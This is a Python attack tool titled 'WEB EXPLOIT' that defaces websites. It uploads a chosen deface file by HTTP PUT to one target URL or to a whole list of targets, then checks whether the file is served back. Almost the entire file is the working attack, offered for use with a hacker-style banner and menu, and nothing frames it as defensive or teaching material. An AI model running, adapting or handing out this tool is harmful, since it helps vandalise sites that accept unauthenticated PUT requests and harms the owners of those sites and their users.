import requests
import os,sys
import time
#coder : $0ul
#date  : 13/2/2022
#banner
os.system("clear")
def banner():
  banner =  """\033[1;37m
                    \033[1;41m\033[1;37m    WEB EXPLOIT     \033[0m\033[1;34m
              
                          \     /
                           \ _ /
                        ----/_\----
            x--------------( . )--------------x
                 x|x   | |_|\_/|_| |   x|x
                  x    x           x    x     

      \033[1;32m                 Author : $0ul
      \033[1;37m------------------------------------------------
      
     \033[1;33m Menu\033[0m 
      -----
      \033[1;34m(\033[1;31m1\033[1;34m)\033[1;36m single_web_deface
      \033[1;34m(\033[1;31m2\033[1;34m)\033[1;36m multiple_web_deface
      
            \033[0m"""
  print(banner)
#single_web_deface
def single():
    target = input(" \033[1;33m[\033[1;34m*\033[1;33m] \033[1;33m Enter Target Url \033[1;32m : \033[1;37m")
    deface_file = input(" \033[1;33m[\033[1;34m*\033[1;33m] \033[1;33m Enter Deface File\033[1;32m : \033[1;37m")
    file_name = os.path.basename(deface_file)
    file_data = open(deface_file).read()
    req = requests.Session()
    try : 
        if target[-1] == "/":
           pass
        else :
           target = target+"/"
        req = requests.put(target+file_name,data=file_data)
        if req.status_code == 200 or req.status_code == 201:
           req2 = requests.get(target+file_name)
           response = req2.text.lower()
           if "404" in response:
             print(f" \033[1;37m[+] \033[1;33m[\033[1;31mFailed \033[1;33m] \033[1;34m => \033[1;31m{target}{file_name}\033[0m")
           elif  "not found" in response:
             print(f" \033[1;37m[+] \033[1;33m[\033[1;31mFailed \033[1;33m] \033[1;34m => \033[1;31m{target}{file_name}\033[0m")
           elif "error" in response:
             print(f" \033[1;37m[+] \033[1;33m[\033[1;31mFailed \033[1;33m] \033[1;34m => \033[1;31m{target}{file_name}\033[0m")
           elif "rejected" in response:
                 print(f" \033[1;37m{count:4}. \033[1;33m[\033[1;31mFailed \033[1;33m] \033[1;34m => \033[1;31m{target}{file_name}\033[0m")   
           else : 
             print(f" \033[1;37m[+] \033[1;33m[\033[1;32mSuccess\033[1;33m] \033[1;34m => \033[1;32m{target}{file_name}\033[0m")
        else :
           print(f" \033[1;37m[+] \033[1;33m[\033[1;31mFailed \033[1;33m] \033[1;34m => \033[1;31m{target}{file_name}\033[0m")
    except :
        print("      \033[1;31m Host is down!\033[0m")
#multiple_web_deface
def multiple():
    target_list = input(" \033[1;33m[\033[1;34m*\033[1;33m] \033[1;33m Enter Target File\033[1;32m : \033[1;37m")
    deface_file = input(" \033[1;33m[\033[1;34m*\033[1;33m] \033[1;33m Enter Deface File\033[1;32m : \033[1;37m")
    file_name = os.path.basename(deface_file)
    target_urls = []
    targets = open(f"{target_list}","r")
    targets = targets.readlines()
    for target_url in targets:
        target_url = target_url.strip()
        target_urls.append(target_url)
    file_data = open(deface_file).read()
    req = requests.Session()
    count = 1
    try : 
      for target in target_urls:
        if target[-1] == "/":
           pass
        else :
           target = target+"/"
        try :
           req = requests.put(target+file_name,data=file_data)
           if req.status_code == 200 or req.status_code == 201 :
              req2 = requests.get(target+file_name)
              response = req2.text.lower()
              if "404" in response:
                 print(f" \033[1;37m{count:4}. \033[1;33m[\033[1;31mFailed \033[1;33m] \033[1;34m => \033[1;31m{target}{file_name}\033[0m")
              elif  "not found" in response:
                 print(f" \033[1;37m{count:4}. \033[1;33m[\033[1;31mFailed \033[1;33m] \033[1;34m => \033[1;31m{target}{file_name}\033[0m")
              elif "error" in response:
                 print(f" \033[1;37m{count:4}. \033[1;33m[\033[1;31mFailed \033[1;33m] \033[1;34m => \033[1;31m{target}{file_name}\033[0m")
              elif "rejected" in response:
                 print(f" \033[1;37m{count:4}. \033[1;33m[\033[1;31mFailed \033[1;33m] \033[1;34m => \033[1;31m{target}{file_name}\033[0m")
              else:
                 print(f" \033[1;37m{count:4}. \033[1;33m[\033[1;32mSuccess\033[1;33m] \033[1;34m => \033[1;32m{target}{file_name}\033[0m")
           else :
              print(f" \033[1;37m{count:4}. \033[1;33m[\033[1;31mFailed \033[1;33m] \033[1;34m => \033[1;31m{target}{file_name}\033[0m")
        except requests.exceptions.RequestException:
           continue
        count = count + 1
    except: 
        print("")
        print("Keyboard Interrupt")
def menu():
    option = input(" \033[1;33m[\033[1;34m*\033[1;33m] \033[1;33m Choose an option \033[1;32m : \033[1;37m")
    if option == "1":
       single()
    elif option == "2":
       multiple()
    else :
       print("")
       print(" Invalid Option")
   
banner()
menu()
